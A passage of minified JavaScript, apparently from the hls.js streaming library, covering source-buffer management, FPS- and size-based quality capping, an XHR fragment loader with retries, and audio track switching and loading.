t.parent===r?e+1:e}),0),n={},i=o.sourceBuffer;for(var a in i){var s=i[a];if(!s)throw Error("handling source buffer update end error: source buffer for "+a+" uninitilized and unable to update buffered TimeRanges.");n[a]=s.buffered}o.hls.trigger(M.default.BUFFER_APPENDED,{parent:r,pending:t,timeRanges:n}),o._needsFlush||o.doAppending(),o.updateMediaElementDuration(),0===t&&o.flushLiveBackBuffer()},o._onSBUpdateError=function(e){F.logger.error("sourceBuffer error:",e),o.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:A.ErrorDetails.BUFFER_APPENDING_ERROR,fatal:!1})},o.config=e.config,o}!function Mt(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,t);var r=e.prototype;return r.destroy=function e(){i.prototype.destroy.call(this)},r.onLevelPtsUpdated=function e(t){var r=t.type,n=this.tracks.audio;if("audio"===r&&n&&"audio/mpeg"===n.container){var i=this.sourceBuffer.audio;if(!i)throw Error("Level PTS Updated and source buffer for audio uninitalized");if(Math.abs(i.timestampOffset-t.start)>.1){var s=i.updating;try{i.abort()}catch(e){F.logger.warn("can not abort audio buffer: "+e)}s?this.audioTimestampOffset=t.start:(F.logger.warn("change mpeg audio timestamp offset from "+i.timestampOffset+" to "+t.start),i.timestampOffset=t.start)}}},r.onManifestParsed=function e(t){var r=2;(t.audio&&!t.video||!t.altAudio)&&(r=1),this.bufferCodecEventsExpected=this._bufferCodecEventsTotal=r,F.logger.log(this.bufferCodecEventsExpected+" bufferCodec event(s) expected")},r.onMediaAttaching=function e(t){var r=this.media=t.media;if(r&&Ft){var n=this.mediaSource=new Ft;n.addEventListener("sourceopen",this._onMediaSourceOpen),n.addEventListener("sourceended",this._onMediaSourceEnded),n.addEventListener("sourceclose",this._onMediaSourceClose),r.src=window.URL.createObjectURL(n),this._objectUrl=r.src}},r.onMediaDetaching=function e(){F.logger.log("media source detaching");var t=this.mediaSource;if(t){if("open"===t.readyState)try{t.endOfStream()}catch(e){F.logger.warn("onMediaDetaching:"+e.message+" while calling endOfStream")}t.removeEventListener("sourceopen",this._onMediaSourceOpen),t.removeEventListener("sourceended",this._onMediaSourceEnded),t.removeEventListener("sourceclose",this._onMediaSourceClose),this.media&&(this._objectUrl&&window.URL.revokeObjectURL(this._objectUrl),this.media.src===this._objectUrl?(this.media.removeAttribute("src"),this.media.load()):F.logger.warn("media.src was changed by a third party - skip cleanup")),this.mediaSource=null,this.media=null,this._objectUrl=null,this.bufferCodecEventsExpected=this._bufferCodecEventsTotal,this.pendingTracks={},this.tracks={},this.sourceBuffer={},this.flushRange=[],this.segments=[],this.appended=0}this.hls.trigger(M.default.MEDIA_DETACHED)},r.checkPendingTracks=function e(){var t=this.bufferCodecEventsExpected,r=this.pendingTracks,n=Object.keys(r).length;(n&&!t||2===n)&&(this.createSourceBuffers(r),this.pendingTracks={},this.doAppending())},r.onBufferReset=function e(){var t=this.sourceBuffer;for(var r in t){var n=t[r];try{n&&(this.mediaSource&&this.mediaSource.removeSourceBuffer(n),n.removeEventListener("updateend",this._onSBUpdateEnd),n.removeEventListener("error",this._onSBUpdateError))}catch(e){}}this.sourceBuffer={},this.flushRange=[],this.segments=[],this.appended=0},r.onBufferCodecs=function e(t){var r=this;Object.keys(this.sourceBuffer).length||(Object.keys(t).forEach((function(e){r.pendingTracks[e]=t[e]})),this.bufferCodecEventsExpected=Math.max(this.bufferCodecEventsExpected-1,0),this.mediaSource&&"open"===this.mediaSource.readyState&&this.checkPendingTracks())},r.createSourceBuffers=function e(t){var r=this.sourceBuffer,n=this.mediaSource;if(!n)throw Error("createSourceBuffers called when mediaSource was null");for(var i in t)if(!r[i]){var a=t[i];if(!a)throw Error("source buffer exists for track "+i+", however track does not");var s=a.levelCodec||a.codec,o=a.container+";codecs="+s;F.logger.log("creating sourceBuffer("+o+")");try{var l=r[i]=n.addSourceBuffer(o);l.addEventListener("updateend",this._onSBUpdateEnd),l.addEventListener("error",this._onSBUpdateError),this.tracks[i]={buffer:l,codec:s,id:a.id,container:a.container,levelCodec:a.levelCodec}}catch(e){F.logger.error("error while trying to add sourceBuffer:"+e.message),this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:A.ErrorDetails.BUFFER_ADD_CODEC_ERROR,fatal:!1,err:e,mimeType:o})}}this.hls.trigger(M.default.BUFFER_CREATED,{tracks:this.tracks})},r.onBufferAppending=function e(t){this._needsFlush||(this.segments?this.segments.push(t):this.segments=[t],this.doAppending())},r.onBufferEos=function e(t){for(var r in this.sourceBuffer)if(!t.type||t.type===r){var n=this.sourceBuffer[r];n&&!n.ended&&(n.ended=!0,F.logger.log(r+" sourceBuffer now EOS"))}this.checkEos()},r.checkEos=function e(){var t=this.sourceBuffer,r=this.mediaSource;if(r&&"open"===r.readyState){for(var n in t){var i=t[n];if(i){if(!i.ended)return;if(i.updating)return void(this._needsEos=!0)}}F.logger.log("all media data are available, signal endOfStream() to MediaSource and stop loading fragment");try{r.endOfStream()}catch(e){F.logger.warn("exception while calling mediaSource.endOfStream()")}this._needsEos=!1}else this._needsEos=!1},r.onBufferFlushing=function e(t){t.type?this.flushRange.push({start:t.startOffset,end:t.endOffset,type:t.type}):(this.flushRange.push({start:t.startOffset,end:t.endOffset,type:"video"}),this.flushRange.push({start:t.startOffset,end:t.endOffset,type:"audio"})),this.flushBufferCounter=0,this.doFlush()},r.flushLiveBackBuffer=function e(){if(this._live){var t=this.config.liveBackBufferLength;if(isFinite(t)&&!(t<0))if(this.media)for(var r=this.media.currentTime,n=this.sourceBuffer,i=Object.keys(n),a=r-Math.max(t,this._levelTargetDuration),s=i.length-1;s>=0;s--){var o=i[s],l=n[o];if(l){var u=l.buffered;u.length>0&&a>u.start(0)&&this.removeBufferRange(o,l,0,a)&&this.hls.trigger(M.default.LIVE_BACK_BUFFER_REACHED,{bufferEnd:a})}}else F.logger.error("flushLiveBackBuffer called without attaching media")}},r.onLevelUpdated=function e(t){var r=t.details;r.fragments.length>0&&(this._levelDuration=r.totalduration+r.fragments[0].start,this._levelTargetDuration=r.averagetargetduration||r.targetduration||10,this._live=r.live,this.updateMediaElementDuration())},r.updateMediaElementDuration=function e(){var r,t=this.config;if(null!==this._levelDuration&&this.media&&this.mediaSource&&this.sourceBuffer&&0!==this.media.readyState&&"open"===this.mediaSource.readyState){for(var n in this.sourceBuffer){var i=this.sourceBuffer[n];if(i&&!0===i.updating)return}r=this.media.duration,null===this._msDuration&&(this._msDuration=this.mediaSource.duration),!0===this._live&&!0===t.liveDurationInfinity?(F.logger.log("Media Source duration is set to Infinity"),this._msDuration=this.mediaSource.duration=1/0):(this._levelDuration>this._msDuration&&this._levelDuration>r||!Object(x.isFiniteNumber)(r))&&(F.logger.log("Updating Media Source duration to "+this._levelDuration.toFixed(3)),this._msDuration=this.mediaSource.duration=this._levelDuration)}},r.doFlush=function e(){for(;this.flushRange.length;){var t=this.flushRange[0];if(!this.flushBuffer(t.start,t.end,t.type))return void(this._needsFlush=!0);this.flushRange.shift(),this.flushBufferCounter=0}if(0===this.flushRange.length){this._needsFlush=!1;var r=0,n=this.sourceBuffer;try{for(var i in n){var a=n[i];a&&(r+=a.buffered.length)}}catch(e){F.logger.error("error while accessing sourceBuffer.buffered")}this.appended=r,this.hls.trigger(M.default.BUFFER_FLUSHED)}},r.doAppending=function e(){var t=this.config,r=this.hls,n=this.segments,i=this.sourceBuffer;if(Object.keys(i).length){if(!this.media||this.media.error)return this.segments=[],void F.logger.error("trying to append although a media error occured, flush segment and abort");if(!this.appending){var a=n.shift();if(a)try{var s=i[a.type];if(!s)return void this._onSBUpdateEnd();if(s.updating)return void n.unshift(a);s.ended=!1,this.parent=a.parent,s.appendBuffer(a.data),this.appendError=0,this.appended++,this.appending=!0}catch(e){F.logger.error("error while trying to append buffer:"+e.message),n.unshift(a);var o={type:A.ErrorTypes.MEDIA_ERROR,parent:a.parent,details:"",fatal:!1};22===e.code?(this.segments=[],o.details=A.ErrorDetails.BUFFER_FULL_ERROR):(this.appendError++,o.details=A.ErrorDetails.BUFFER_APPEND_ERROR,this.appendError>t.appendErrorMaxRetry&&(F.logger.log("fail "+t.appendErrorMaxRetry+" times to append segment in sourceBuffer"),this.segments=[],o.fatal=!0)),r.trigger(M.default.ERROR,o)}}}},r.flushBuffer=function e(t,r,n){var i=this.sourceBuffer;if(!Object.keys(i).length)return!0;var a="null";if(this.media&&(a=this.media.currentTime.toFixed(3)),F.logger.log("flushBuffer,pos/start/end: "+a+"/"+t+"/"+r),this.flushBufferCounter>=this.appended)return F.logger.warn("abort flushing too many retries"),!0;var s=i[n];if(s){if(s.ended=!1,s.updating)return F.logger.warn("cannot flush, sb updating in progress"),!1;if(this.removeBufferRange(n,s,t,r))return this.flushBufferCounter++,!1}return F.logger.log("buffer flushed"),!0},r.removeBufferRange=function e(t,r,n,i){try{for(var a=0;a<r.buffered.length;a++){var s=r.buffered.start(a),o=r.buffered.end(a),l=Math.max(s,n),u=Math.min(o,i);if(Math.min(u,o)-l>.5){var c="null";return this.media&&(c=this.media.currentTime.toString()),F.logger.log("sb remove "+t+" ["+l+","+u+"], of ["+s+","+o+"], pos:"+c),r.remove(l,u),!0}}}catch(e){F.logger.warn("removeBufferRange failed",e)}return!1},e}(i),Ut=Bt;function jt(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Kt=function(r){function i(e){var t;return(t=r.call(this,e,M.default.FPS_DROP_LEVEL_CAPPING,M.default.MEDIA_ATTACHING,M.default.MANIFEST_PARSED,M.default.LEVELS_UPDATED,M.default.BUFFER_CODECS,M.default.MEDIA_DETACHING)||this).autoLevelCapping=Number.POSITIVE_INFINITY,t.firstLevel=null,t.levels=[],t.media=null,t.restrictedLevels=[],t.timer=null,t.clientRect=null,t}!function Gt(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(i,r);var e=i.prototype;return e.destroy=function e(){this.hls.config.capLevelToPlayerSize&&(this.media=null,this.clientRect=null,this.stopCapping())},e.onFpsDropLevelCapping=function e(t){i.isLevelAllowed(t.droppedLevel,this.restrictedLevels)&&this.restrictedLevels.push(t.droppedLevel)},e.onMediaAttaching=function e(t){this.media=t.media instanceof window.HTMLVideoElement?t.media:null},e.onManifestParsed=function e(t){var r=this.hls;this.restrictedLevels=[],this.levels=t.levels,this.firstLevel=t.firstLevel,r.config.capLevelToPlayerSize&&t.video&&this.startCapping()},e.onBufferCodecs=function e(t){this.hls.config.capLevelToPlayerSize&&t.video&&this.startCapping()},e.onLevelsUpdated=function e(t){this.levels=t.levels},e.onMediaDetaching=function e(){this.stopCapping()},e.detectPlayerSize=function e(){if(this.media){var t=this.levels?this.levels.length:0;if(t){var r=this.hls;r.autoLevelCapping=this.getMaxLevel(t-1),r.autoLevelCapping>this.autoLevelCapping&&r.streamController.nextLevelSwitch(),this.autoLevelCapping=r.autoLevelCapping}}},e.getMaxLevel=function e(r){var n=this;if(!this.levels)return-1;var t=this.levels.filter((function(e,t){return i.isLevelAllowed(t,n.restrictedLevels)&&t<=r}));return this.clientRect=null,i.getMaxLevelByMediaSize(t,this.mediaWidth,this.mediaHeight)},e.startCapping=function e(){this.timer||(this.autoLevelCapping=Number.POSITIVE_INFINITY,this.hls.firstLevel=this.getMaxLevel(this.firstLevel),clearInterval(this.timer),this.timer=setInterval(this.detectPlayerSize.bind(this),1e3),this.detectPlayerSize())},e.stopCapping=function e(){this.restrictedLevels=[],this.firstLevel=null,this.autoLevelCapping=Number.POSITIVE_INFINITY,this.timer&&(this.timer=clearInterval(this.timer),this.timer=null)},e.getDimensions=function e(){if(this.clientRect)return this.clientRect;var t=this.media,r={width:0,height:0};if(t){var n=t.getBoundingClientRect();r.width=n.width,r.height=n.height,r.width||r.height||(r.width=n.right-n.left||t.width||0,r.height=n.bottom-n.top||t.height||0)}return this.clientRect=r,r},i.isLevelAllowed=function e(t,r){return void 0===r&&(r=[]),-1===r.indexOf(t)},i.getMaxLevelByMediaSize=function e(t,r,n){if(!t||t&&!t.length)return-1;for(var i=function e(t,r){return!r||(t.width!==r.width||t.height!==r.height)},a=t.length-1,s=0;s<t.length;s+=1){var o=t[s];if((o.width>=r||o.height>=n)&&i(o,t[s+1])){a=s;break}}return a},function Vt(e,t,r){return t&&jt(e.prototype,t),r&&jt(e,r),e}(i,[{key:"mediaWidth",get:function e(){return this.getDimensions().width*i.contentScaleFactor}},{key:"mediaHeight",get:function e(){return this.getDimensions().height*i.contentScaleFactor}}],[{key:"contentScaleFactor",get:function e(){var t=1;try{t=window.devicePixelRatio}catch(e){}return t}}]),i}(i),Yt=Kt;var $t=window.performance,Wt=function(t){function e(e){return t.call(this,e,M.default.MEDIA_ATTACHING)||this}!function Ht(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,t);var r=e.prototype;return r.destroy=function e(){this.timer&&clearInterval(this.timer),this.isVideoPlaybackQualityAvailable=!1},r.onMediaAttaching=function e(t){var r=this.hls.config;r.capLevelOnFPSDrop&&("function"==typeof(this.video=t.media instanceof window.HTMLVideoElement?t.media:null).getVideoPlaybackQuality&&(this.isVideoPlaybackQualityAvailable=!0),clearInterval(this.timer),this.timer=setInterval(this.checkFPSInterval.bind(this),r.fpsDroppedMonitoringPeriod))},r.checkFPS=function e(t,r,n){var i=$t.now();if(r){if(this.lastTime){var a=i-this.lastTime,s=n-this.lastDroppedFrames,o=r-this.lastDecodedFrames,l=1e3*s/a,u=this.hls;if(u.trigger(M.default.FPS_DROP,{currentDropped:s,currentDecoded:o,totalDroppedFrames:n}),l>0&&s>u.config.fpsDroppedMonitoringThreshold*o){var c=u.currentLevel;F.logger.warn("drop FPS ratio greater than max allowed value for currentLevel: "+c),c>0&&(-1===u.autoLevelCapping||u.autoLevelCapping>=c)&&(c-=1,u.trigger(M.default.FPS_DROP_LEVEL_CAPPING,{level:c,droppedLevel:u.currentLevel}),u.autoLevelCapping=c,u.streamController.nextLevelSwitch())}}this.lastTime=i,this.lastDroppedFrames=n,this.lastDecodedFrames=r}},r.checkFPSInterval=function e(){var t=this.video;if(t)if(this.isVideoPlaybackQualityAvailable){var r=t.getVideoPlaybackQuality();this.checkFPS(t,r.totalVideoFrames,r.droppedVideoFrames)}else this.checkFPS(t,t.webkitDecodedFrameCount,t.webkitDroppedFrameCount)},e}(i),qt=Wt,Xt=function(){function e(e){e&&e.xhrSetup&&(this.xhrSetup=e.xhrSetup)}var t=e.prototype;return t.destroy=function e(){this.abort(),this.loader=null},t.abort=function e(){var t=this.loader;t&&4!==t.readyState&&(this.stats.aborted=!0,t.abort()),window.clearTimeout(this.requestTimeout),this.requestTimeout=null,window.clearTimeout(this.retryTimeout),this.retryTimeout=null},t.load=function e(t,r,n){this.context=t,this.config=r,this.callbacks=n,this.stats={trequest:window.performance.now(),retry:0},this.retryDelay=r.retryDelay,this.loadInternal()},t.loadInternal=function e(){var t,r=this.context;t=this.loader=new window.XMLHttpRequest;var n=this.stats;n.tfirst=0,n.loaded=0;var i=this.xhrSetup;try{if(i)try{i(t,r.url)}catch(e){t.open("GET",r.url,!0),i(t,r.url)}t.readyState||t.open("GET",r.url,!0)}catch(e){return void this.callbacks.onError({code:t.status,text:e.message},r,t)}r.rangeEnd&&t.setRequestHeader("Range","bytes="+r.rangeStart+"-"+(r.rangeEnd-1)),t.onreadystatechange=this.readystatechange.bind(this),t.onprogress=this.loadprogress.bind(this),t.responseType=r.responseType,this.requestTimeout=window.setTimeout(this.loadtimeout.bind(this),this.config.timeout),t.send()},t.readystatechange=function e(t){var r=t.currentTarget,n=r.readyState,i=this.stats,a=this.context,s=this.config;if(!i.aborted&&n>=2)if(window.clearTimeout(this.requestTimeout),0===i.tfirst&&(i.tfirst=Math.max(window.performance.now(),i.trequest)),4===n){var o=r.status;if(o>=200&&o<300){var l,u;i.tload=Math.max(i.tfirst,window.performance.now()),u="arraybuffer"===a.responseType?(l=r.response).byteLength:(l=r.responseText).length,i.loaded=i.total=u;var c={url:r.responseURL,data:l};this.callbacks.onSuccess(c,i,a,r)}else i.retry>=s.maxRetry||o>=400&&o<499?(F.logger.error(o+" while loading "+a.url),this.callbacks.onError({code:o,text:r.statusText},a,r)):(F.logger.warn(o+" while loading "+a.url+", retrying in "+this.retryDelay+"..."),this.destroy(),this.retryTimeout=window.setTimeout(this.loadInternal.bind(this),this.retryDelay),this.retryDelay=Math.min(2*this.retryDelay,s.maxRetryDelay),i.retry++)}else this.requestTimeout=window.setTimeout(this.loadtimeout.bind(this),s.timeout)},t.loadtimeout=function e(){F.logger.warn("timeout while loading "+this.context.url),this.callbacks.onTimeout(this.stats,this.context,null)},t.loadprogress=function e(t){var r=t.currentTarget,n=this.stats;n.loaded=t.loaded,t.lengthComputable&&(n.total=t.total);var i=this.callbacks.onProgress;i&&i(n,this.context,null,r)},e}(),Zt=Xt;function Qt(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var tr=function(r){function e(e){var t;return(t=r.call(this,e,M.default.MANIFEST_LOADING,M.default.MANIFEST_PARSED,M.default.AUDIO_TRACK_LOADED,M.default.AUDIO_TRACK_SWITCHED,M.default.LEVEL_LOADED,M.default.ERROR)||this)._trackId=-1,t._selectDefaultTrack=!0,t.tracks=[],t.trackIdBlacklist=Object.create(null),t.audioGroupId=null,t}!function er(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,r);var t=e.prototype;return t.onManifestLoading=function e(){this.tracks=[],this._trackId=-1,this._selectDefaultTrack=!0},t.onManifestParsed=function e(t){var r=this.tracks=t.audioTracks||[];this.hls.trigger(M.default.AUDIO_TRACKS_UPDATED,{audioTracks:r}),this._selectAudioGroup(this.hls.nextLoadLevel)},t.onAudioTrackLoaded=function e(t){if(t.id>=this.tracks.length)F.logger.warn("Invalid audio track id:",t.id);else{if(F.logger.log("audioTrack "+t.id+" loaded"),this.tracks[t.id].details=t.details,t.details.live&&!this.hasInterval()){var r=1e3*t.details.targetduration;this.setInterval(r)}!t.details.live&&this.hasInterval()&&this.clearInterval()}},t.onAudioTrackSwitched=function e(t){var r=this.tracks[t.id].groupId;r&&this.audioGroupId!==r&&(this.audioGroupId=r)},t.onLevelLoaded=function e(t){this._selectAudioGroup(t.level)},t.onError=function e(t){t.type===A.ErrorTypes.NETWORK_ERROR&&(t.fatal&&this.clearInterval(),t.details===A.ErrorDetails.AUDIO_TRACK_LOAD_ERROR&&(F.logger.warn("Network failure on audio-track id:",t.context.id),this._handleLoadError()))},t._setAudioTrack=function e(t){if(this._trackId===t&&this.tracks[this._trackId].details)F.logger.debug("Same id as current audio-track passed, and track details available -> no-op");else if(t<0||t>=this.tracks.length)F.logger.warn("Invalid id passed to audio-track controller");else{var r=this.tracks[t];F.logger.log("Now switching to audio-track index "+t),this.clearInterval(),this._trackId=t;var n=r.url,i=r.type,a=r.id;this.hls.trigger(M.default.AUDIO_TRACK_SWITCHING,{id:a,type:i,url:n}),this._loadTrackDetailsIfNeeded(r)}},t.doTick=function e(){this._updateTrack(this._trackId)},t._selectAudioGroup=function e(t){var r=this.hls.levels[t];if(r&&r.audioGroupIds){var n=r.audioGroupIds[r.urlId];this.audioGroupId!==n&&(this.audioGroupId=n,this._selectInitialAudioTrack())}},t._selectInitialAudioTrack=function e(){var t=this,r=this.tracks;if(r.length){var n=this.tracks[this._trackId],i=null;if(n&&(i=n.name),this._selectDefaultTrack){var a=r.filter((function(e){return e.default}));a.length?r=a:F.logger.warn("No default audio tracks defined")}var s=!1,o=function e(){r.forEach((function(e){s||t.audioGroupId&&e.groupId!==t.audioGroupId||i&&i!==e.name||(t._setAudioTrack(e.id),s=!0)}))};o(),s||(i=null,o()),s||(F.logger.error("No track found for running audio group-ID: "+this.audioGroupId),this.hls.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:A.ErrorDetails.AUDIO_TRACK_LOAD_ERROR,fatal:!0}))}},t._needsTrackLoading=function e(t){var r=t.details,n=t.url;return!(r&&!r.live)&&!!n},t._loadTrackDetailsIfNeeded=function e(t){if(this._needsTrackLoading(t)){var r=t.url,n=t.id;F.logger.log("loading audio-track playlist for id: "+n),this.hls.trigger(M.default.AUDIO_TRACK_LOADING,{url:r,id:n})}},t._updateTrack=function e(t){if(!(t<0||t>=this.tracks.length)){this.clearInterval(),this._trackId=t,F.logger.log("trying to update audio-track "+t);var r=this.tracks[t];this._loadTrackDetailsIfNeeded(r)}},t._handleLoadError=function e(){this.trackIdBlacklist[this._trackId]=!0;var t=this._trackId,r=this.tracks[t],n=r.name,i=r.language,a=r.groupId;F.logger.warn("Loading failed on audio track id: "+t+", group-id: "+a+', name/language: "'+n+'" / "'+i+'"');for(var s=t,o=0;o<this.tracks.length;o++){if(!this.trackIdBlacklist[o])if(this.tracks[o].name===n){s=o;break}}s!==t?(F.logger.log("Attempting audio-track fallback id:",s,"group-id:",this.tracks[s].groupId),this._setAudioTrack(s)):F.logger.warn('No fallback audio-track found for name/language: "'+n+'" / "'+i+'"')},function Jt(e,t,r){return t&&Qt(e.prototype,t),r&&Qt(e,r),e}(e,[{key:"audioTracks",get:function e(){return this.tracks}},{key:"audioTrack",get:function e(){return this._trackId},set:function e(t){this._setAudioTrack(t),this._selectDefaultTrack=!1}}]),e}(rt),rr=tr;function nr(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Y=window.performance,lr=function(n){function e(e,t){var r;return(r=n.call(this,e,M.default.MEDIA_ATTACHED,M.default.MEDIA_DETACHING,M.default.AUDIO_TRACKS_UPDATED,M.default.AUDIO_TRACK_SWITCHING,M.default.AUDIO_TRACK_LOADED,M.default.KEY_LOADED,M.default.FRAG_LOADED,M.default.FRAG_PARSING_INIT_SEGMENT,M.default.FRAG_PARSING_DATA,M.default.FRAG_PARSED,M.default.ERROR,M.default.BUFFER_RESET,M.default.BUFFER_CREATED,M.default.BUFFER_APPENDED,M.default.BUFFER_FLUSHED,M.default.INIT_PTS_FOUND)||this).fragmentTracker=t,r.config=e.config,r.audioCodecSwap=!1,r._state=K_STOPPED,r.initPTS=[],r.waitingFragment=null,r.videoTrackCC=null,r.waitingVideoCC=null,r}!function ar(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,n);var t=e.prototype;return t.onInitPtsFound=function e(t){var r=t.id,n=t.frag.cc,i=t.initPTS;"main"===r&&(this.initPTS[n]=i,this.videoTrackCC=n,F.logger.log("InitPTS for cc: "+n+" found from main: "+i),this.state===K_WAITING_INIT_PTS&&this.tick())},t.startLoad=function e(t){if(this.tracks){var r=this.lastCurrentTime;this.stopLoad(),this.setInterval(100),this.fragLoadError=0,r>0&&-1===t?(F.logger.log("audio:override startPosition with lastCurrentTime @"+r.toFixed(3)),this.state=K_IDLE):(this.lastCurrentTime=this.startPosition?this.startPosition:t,this.state=K_STARTING),this.nextLoadPosition=this.startPosition=this.lastCurrentTime,this.tick()}else this.startPosition=t,this.state=K_STOPPED},t.doTick=function e(){var t,r,n,i=this.hls,a=i.config;switch(this.state){case K_ERROR:case K_PAUSED:case K_BUFFER_FLUSHING:break;case K_STARTING:this.state=K_WAITING_TRACK,this.loadedmetadata=!1;break;case K_IDLE:var s=this.tracks;if(!s)break;if(!this.media&&(this.startFragRequested||!a.startFragPrefetch))break;if(this.loadedmetadata)t=this.media.currentTime;else if(void 0===(t=this.nextLoadPosition))break;var o=this.mediaBuffer?this.mediaBuffer:this.media,l=this.videoBuffer?this.videoBuffer:this.media,u=t<a.maxBufferHole?Math.max(2,a.maxBufferHole):a.maxBufferHole,c=j.bufferInfo(o,t,u),d=j.bufferInfo(l,t,u),f=c.len,h=c.end,p=this.fragPrevious,v=Math.min(a.maxBufferLength,a.maxMaxBufferLength),g=Math.max(v,d.len),A=this.audioSwitch,m=this.trackId;if((f<g||A)&&m<s.length){if(void 0===(n=s[m].details)){this.state=K_WAITING_TRACK;break}if(!A&&this._streamEnded(c,n))return this.hls.trigger(M.default.BUFFER_EOS,{type:"audio"}),void(this.state=K_ENDED);var _,y=n.fragments,E=y.length,b=y[0].start,k=y[E-1].start+y[E-1].duration;if(A)if(n.live&&!n.PTSKnown)F.logger.log("switching audiotrack, live stream, unknown PTS,load first fragment"),h=0;else if(h=t,n.PTSKnown&&t<b){if(!(c.end>b||c.nextStart))return;F.logger.log("alt audio track ahead of main track, seek to start of alt audio track"),this.media.currentTime=b+.05}if(n.initSegment&&!n.initSegment.data)_=n.initSegment;else if(h<=b){if(_=y[0],null!==this.videoTrackCC&&_.cc!==this.videoTrackCC&&(_=function je(e,t){return U.search(e,(function(e){return e.cc<t?1:e.cc>t?-1:0}))}(y,this.videoTrackCC)),n.live&&_.loadIdx&&_.loadIdx===this.fragLoadIdx){var T=c.nextStart?c.nextStart:b;return F.logger.log("no alt audio available @currentTime:"+this.media.currentTime+", seeking @"+(T+.05)),void(this.media.currentTime=T+.05)}}else{var S,C=a.maxFragLookUpTolerance,R=p?y[p.sn-y[0].sn+1]:void 0;h<k?(h>k-C&&(C=0),S=R&&!V(h,C,R)?R:U.search(y,(function(e){return V(h,C,e)}))):S=y[E-1],S&&(_=S,b=S.start,p&&_.level===p.level&&_.sn===p.sn&&(_.sn<n.endSN?(_=y[_.sn+1-n.startSN],this.fragmentTracker.getState(_)!==B_OK&&F.logger.log("SN just loaded, load next one: "+_.sn)):_=null))}_&&(_.encrypted?(F.logger.log("Loading key for "+_.sn+" of ["+n.startSN+" ,"+n.endSN+"],track "+m),this.state=K_KEY_LOADING,i.trigger(M.default.KEY_LOADING,{frag:_})):(this.fragCurrent=_,(A||this.fragmentTracker.getState(_)===B_NOT_LOADED)&&(F.logger.log("Loading "+_.sn+", cc: "+_.cc+" of ["+n.startSN+" ,"+n.endSN+"],track "+m+", "+(this.loadedmetadata?"currentTime":"nextLoadPosition")+": "+t+", bufferEnd: "+h.toFixed(3)),"initSegment"!==_.sn&&(this.startFragRequested=!0),Object(x.isFiniteNumber)(_.sn)&&(this.nextLoadPosition=_.start+_.duration),i.trigger(M.default.FRAG_LOADING,{frag:_}),this.state=K_FRAG_LOADING)))}break;case K_WAITING_TRACK:(r=this.tracks[this.trackId])&&r.details&&(this.state=K_IDLE);break;case K_FRAG_LOADING_WAITING_RETRY:var w=Y.now(),O=this.retryDate,L=(o=this.media)&&o.seeking;(!O||w>=O||L)&&(F.logger.log("audioStreamController: retryDate reached, switch back to IDLE state"),this.state=K_IDLE);break;case K_WAITING_INIT_PTS:var I=this.waitingFragment;if(I){var D=I.frag.cc;if(void 0!==this.initPTS[D])this.waitingFragment=null,this.state=K_FRAG_LOADING,this.onFragLoaded(I);else if(this.videoTrackCC!==this.waitingVideoCC)F.logger.log("Waiting fragment cc ("+D+") cancelled because video is at cc "+this.videoTrackCC),this.clearWaitingFragment();else{var P=j.bufferInfo(this.mediaBuffer,this.media.currentTime,a.maxBufferHole);V(P.end,a.maxFragLookUpTolerance,I.frag)<0&&(F.logger.log("Waiting fragment cc ("+D+") @ "+I.frag.start+" cancelled because another fragment at "+P.end+" is needed"),this.clearWaitingFragment())}}else this.state=K_IDLE}},t.clearWaitingFragment=function e(){var t=this.waitingFragment;t&&(this.fragmentTracker.removeFragment(t.frag),this.waitingFragment=null,this.waitingVideoCC=null,this.state=K_IDLE)},t.onMediaAttached=function e(t){var r=this.media=this.mediaBuffer=t.media;this.onvseeking=this.onMediaSeeking.bind(this),this.onvended=this.onMediaEnded.bind(this),r.addEventListener("seeking",this.onvseeking),r.addEventListener("ended",this.onvended);var n=this.config;this.tracks&&n.autoStartLoad&&this.startLoad(n.startPosition)},t.onMediaDetaching=function e(){var t=this.media;t&&t.ended&&(F.logger.log("MSE detaching and video ended, reset startPosition"),this.startPosition=this.lastCurrentTime=0),t&&(t.removeEventListener("seeking",this.onvseeking),t.removeEventListener("ended",this.onvended),this.onvseeking=this.onvseeked=this.onvended=null),this.media=this.mediaBuffer=this.videoBuffer=null,this.loadedmetadata=!1,this.fragmentTracker.removeAllFragments(),this.stopLoad()},t.onAudioTracksUpdated=function e(t){F.logger.log("audio tracks updated"),this.tracks=t.audioTracks},t.onAudioTrackSwitching=function e(t){var r=!!t.url;this.trackId=t.id,this.fragCurrent=null,this.clearWaitingFragment(),this.state=K_PAUSED,r?this.setInterval(100):this.demuxer&&(this.demuxer.destroy(),this.demuxer=null),r&&(this.audioSwitch=!0,this.state=K_IDLE),this.tick()},t.onAudioTrackLoaded=function e(t){var r=t.details,n=t.id,i=this.tracks[n],a=i.details,s=r.totalduration,o=0;if(F.logger.log("track "+n+" loaded ["+r.startSN+","+r.endSN+"],duration:"+s),r.live||a&&a.live?a&&r.fragments.length>0?(De(a,r),o=r.fragments[0].start,r.PTSKnown?F.logger.log("live audio playlist sliding:"+o.toFixed(3)):F.logger.log("live audio playlist - outdated PTS, unknown sliding")):(r.PTSKnown=!1,F.logger.log("live audio playlist - first load, unknown sliding")):r.PTSKnown=!1,i.details=r,!this.startFragRequested){if(-1===this.startPosition){var l=r.startTimeOffset;Object(x.isFiniteNumber)(l)?(F.logger.log("start time offset found in playlist, adjust startPosition to "+l),this.startPosition=l):r.live?(this.startPosition=this.computeLivePosition(o,r),F.logger.log("compute startPosition for audio-track to 